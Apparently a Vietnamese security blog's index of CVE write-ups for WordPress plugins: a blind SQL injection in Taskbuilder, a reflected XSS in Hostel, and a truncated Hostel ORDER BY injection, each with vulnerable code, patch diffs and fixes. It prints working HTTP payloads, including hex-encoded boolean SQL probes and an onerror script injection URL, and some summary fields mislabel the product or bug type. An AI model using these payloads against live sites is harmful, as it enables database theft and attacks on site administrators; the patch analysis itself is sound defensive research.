ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77 {: .prompt-info }\nS·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói\n·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n\nS·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() ·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c '\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None\nüëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base\nproj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u {: .prompt-info }\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.\nB·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.\nKey takeaways:\n∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-08-31-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) v√† v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ \u003cstrong\u003ex·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o\u003c/strong\u003e tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n \u003ccode\u003e'...'\u003c/code\u003e. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Hostel c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.1.5.8. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ admin.\nCVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.7(vul) v√† v1.1.5.8(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán sanitize (l√†m s·∫°ch d·ªØ li·ªáu) v√† escape (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng Reflected Cross-Site Scripting (XSS)\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file views/bookings.html.php v√† controllers/bookings.php\nFile views/bookings.html.php\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.7\u0026rdquo; }\nTham s·ªë ob ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_GET['ob'] v√† echo ra HTML attribute m√† kh√¥ng c√≥ b·∫•t k√¨ x·ª≠ l√Ω escape n√†o. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn nguy c∆° Reflected XSS (Cross-Site Scripting), v√¨ attacker c√≥ th·ªÉ ch√®n payload v√†o query string,\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.8\u0026rdquo; }\nB·∫£n v√° ƒë√£ s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ encode $_GET['ob'] th√†nh d·∫°ng an to√†n tr∆∞·ªõc khi echo ra HTML attribute.\nSource: $_GET['ob'] l√† d·ªØ li·ªáu nh·∫≠p t·ª´ client (URL query string), attacker c√≥ th·ªÉ ki·ªÉm so√°t ho√†n to√†n. Sink: echo trong HTML attribute ob=\u0026lt;?php echo @$_GET['ob']?\u0026gt; üëâ V√¨ source kh√¥ng ƒëi qua logic c·ªßa controllers n√™n ta kh√¥ng c·∫ßn quan t√¢m diff c·ªßa controllers/bookings.php\nHow it work? ƒê·ªÉ $_GET['ob'] ƒë∆∞·ª£c echo ra HTML attribute c·ªßa th·∫ª \u0026lt;a\u0026gt; th√¨ ƒëi·ªÅu ki·ªán trong kh·ªëi if ch·ª©a th·∫ª \u0026lt;a\u0026gt; ph·∫£i true\n\u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt;\t{: file=\u0026ldquo;views/bookings.html.php\u0026rdquo; }\nüëâ ƒêi·ªÅu ki·ªán quan tr·ªçng c·∫ßn ch√∫ √Ω l√† if($offset \u0026gt; 0), v√¨ ch·ªâ c·∫ßn ƒëi·ªÅu ki·ªán n√†y ƒë√∫ng th√¨ XSS ƒë√£ c√≥ th·ªÉ x·∫£y ra. Kh√¥ng c·∫ßn quan t√¢m if($count \u0026gt; ($page_limit + $offset)).\nFile views/bookings.html.php kh√¥ng th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp, m√† ph·∫£i ƒë∆∞·ª£c controllers g·ªçi th√¥ng qua h√†m include()\nBi·∫øn $offset ƒë∆∞·ª£c controller kh·ªüi t·∫°o tr∆∞·ªõc r·ªìi truy·ªÅn sang view (views/bookings.html.php) ƒë·ªÉ d√πng trong m·ªánh ƒë·ªÅ if.\nƒê·ªÉ x√°c ƒë·ªãnh controller n√†o g·ªçi file view n√†y, ta t√¨m ki·∫øm bi·∫øn $offset trong th∆∞ m·ª•c controllers c·ªßa plugin.\nK·∫øt qu·∫£ cho th·∫•y $offset ƒë∆∞·ª£c t·∫°o trong nh√°nh default (listing bookings) c·ªßa h√†m tƒ©nh manage() trong class WPHostelBookings, n·∫±m ·ªü file controllers/bookings.php.\nController Code\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { // other logic // list bookings default: // which bookings to show - upcoming or past? $type = empty($_GET[\u0026#39;type\u0026#39;]) ? \u0026#39;upcoming\u0026#39; : sanitize_text_field($_GET[\u0026#39;type\u0026#39;]); $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); $dir = empty($_GET[\u0026#39;dir\u0026#39;]) ? \u0026#39;ASC\u0026#39; : $_GET[\u0026#39;dir\u0026#39;]; if($dir != \u0026#39;ASC\u0026#39; and $dir != \u0026#39;DESC\u0026#39;) $dir = \u0026#39;ASC\u0026#39;; $odir = ($dir == \u0026#39;ASC\u0026#39;) ? \u0026#39;DESC\u0026#39; : \u0026#39;ASC\u0026#39;; // other logic // define limit (as it\u0026#39;s paginated)\t$page_limit = 20; $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; // other logic\t$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); $count = $wpdb-\u0026gt;get_var(\u0026#34;SELECT FOUND_ROWS()\u0026#34;);\t// other logic if(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tbreak; } } } {: file=\u0026ldquo;controllers/bookings.php v1.1.5.7\u0026rdquo; }\nPh√¢n t√≠ch bi·∫øn $offset\nBi·∫øn $offset ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ tham s·ªë offset trong URL ($_GET['offset']):\nN·∫øu kh√¥ng c√≥ tham s·ªë =\u0026gt; m·∫∑c ƒë·ªãnh 0. N·∫øu c√≥ =\u0026gt; √©p ki·ªÉu s·ªë nguy√™n b·∫±ng intval(). $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); Ph√¢n t√≠ch bi·∫øn $page_limit\n$page_limit ƒë∆∞·ª£c ƒë·∫∑t c·ªë ƒë·ªãnh l√† 20, d√πng k·∫øt h·ª£p v·ªõi $offset ƒë·ªÉ ph√¢n trang:\n// define limit (as it\u0026#39;s paginated)\t$page_limit = 20; // LIMIT offset, 20 $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; Khi ƒë√≥ SQL tr·∫£ v·ªÅ t·ªëi ƒëa 20 b·∫£n ghi, b·∫Øt ƒë·∫ßu t·ª´ v·ªã tr√≠ $offset.\n√Åp d·ª•ng v√†o m·ªánh ƒë·ªÅ if:\nTrong view, ƒëo·∫°n code XSS payload ch·ªâ hi·ªÉn th·ªã khi:\nif($offset \u0026gt; 0) =\u0026gt; t·ª©c l√† ph·∫£i c√≥ offset t·ª´ 1 tr·ªü l√™n. Mu·ªën offset \u0026gt; 0 c√≥ √Ω nghƒ©a, c∆° s·ªü d·ªØ li·ªáu ph·∫£i c√≥ √≠t nh·∫•t 2 booking. N·∫øu ch·ªâ c√≥ 1 booking th√¨ sau khi b·ªè qua 1 d√≤ng (offset=1), kh√¥ng c√≤n d·ªØ li·ªáu n√†o ƒë·ªÉ hi·ªÉn th·ªã, n√™n payload c≈©ng kh√¥ng render ra. üëâ Do ƒë√≥, ƒë·ªÉ khai th√°c th√†nh c√¥ng, c·∫ßn c√≥ t·ªëi thi·ªÉu 2 booking trong database.\nCu·ªëi c√πng c√°c k·∫øt qu·∫£ ƒë∆∞·ª£c ch·ª©a trong c√°c bi·∫øn s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã ra views th√¥ng qua h√†m include()\nif(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tWPHOSTEL_PATH c√≥ th·ªÉ l√† h·∫±ng global ƒë∆∞·ª£c s·ª≠ d·ª•ng sau khi file PHP ch·ª©a n√≥ ƒë∆∞·ª£c load, ƒê·ªÉ bi·∫øt ƒë∆∞·ª£c ch√≠nh x√°c, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a WPHOSTEL_PATH.\nüëâ WPHOSTEL_PATH b√¢y gi·ªù l√† ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi t·ªõi th∆∞ m·ª•c ch·ª©a file hi·ªán t·∫°i.\nExploit Request v·ªõi XSS payload\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;offset=1\u0026amp;ob=\u0026#34;\u0026gt;\u0026lt;img+src%3D1+onerror%3Dalert%28document.domain%29\u0026gt; HTTP/1.1 Payload th·ª±c t·∫ø:\n\u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt; ƒê√≥ng th·∫ª \u0026lt;a\u0026gt; b·∫±ng k√Ω t·ª± \u0026quot;\u0026gt;. Ch√®n th√™m th·∫ª \u0026lt;img\u0026gt; c√≥ thu·ªôc t√≠nh onerror ƒë·ªÉ k√≠ch ho·∫°t JavaScript. D√πng alert(document.domain) thay cho alert(1) nh∆∞ m·ªôt th√≥i quen, nh·∫±m ch·ª©ng minh r√µ r√†ng kh·∫£ nƒÉng ƒë·ªçc th√¥ng tin t·ª´ DOM. ƒêi·ªÅu n√†y c≈©ng gi√∫p tr√°nh tr∆∞·ªùng h·ª£p Sandbox Domain khi·∫øn cho t√°c ƒë·ªông c·ªßa payload b·ªã xem nh·∫π ho·∫∑c kh√¥ng c√≥. K·∫øt qu·∫£:\nConclusion L·ªó h·ªïng CVE-2025-6234 trong plugin WordPress Hostel b·∫Øt ngu·ªìn t·ª´ vi·ªác kh√¥ng x·ª≠ l√Ω ƒë√∫ng d·ªØ li·ªáu ƒë·∫ßu v√†o ($_GET['ob']) tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n giao di·ªán. ƒêi·ªÅu n√†y m·ªü ra kh·∫£ nƒÉng cho attacker ch√®n m√£ ƒë·ªôc Reflected XSS.\nB·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ escape d·ªØ li·ªáu tr∆∞·ªõc khi in ra HTML, ƒë·∫£m b·∫£o r·∫±ng c√°c gi√° tr·ªã kh√¥ng tin c·∫≠y kh√¥ng th·ªÉ ch√®n script ƒë·ªôc h·∫°i.\nKey takeaways:\nLu√¥n sanitize d·ªØ li·ªáu ƒë·∫ßu v√†o v√† escape d·ªØ li·ªáu ƒë·∫ßu ra theo ng·ªØ c·∫£nh (context). V·ªõi WordPress, t·∫≠n d·ª•ng c√°c h√†m built-in nh∆∞ sanitize_text_field(), esc_attr(), esc_html(), wp_kses()\u0026hellip; ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t. References XSSCross-site scripting (XSS) cheat sheet - PortSwigger\nWordPress Hostel Plugin \u0026lt; 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-28-cve-2025-6234/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eHostel\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.8\u003c/strong\u003e. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ \u003cstrong\u003eadmin\u003c/strong\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-6234\"\u003eCVE-2025-6234\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 1.1.5.8\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (7.1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.7(vul) v√† v1.1.5.8(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán \u003cstrong\u003esanitize\u003c/strong\u003e (l√†m s·∫°ch d·ªØ li·ªáu) v√† \u003cstrong\u003eescape\u003c/strong\u003e (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng \u003cstrong\u003eReflected Cross-Site Scripting (XSS)\u003c/strong\u003e\u003c/p\u003e","title":"CVE-2025-6234"},{"content":"Introduction CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë ob trong ph·∫ßn Manage Bookings.\nBackground Hostel Plugin cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\nForm ƒë·∫∑t ph√≤ng L·ªãch ph√≤ng Qu·∫£n l√Ω bookings Exploitation Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Code Comparison S·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.6\u0026rdquo;}\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } {: file=\u0026ldquo;controlers/bookings.php v1.1.5.7\u0026rdquo;}\nüëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nDetect SQLi ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE 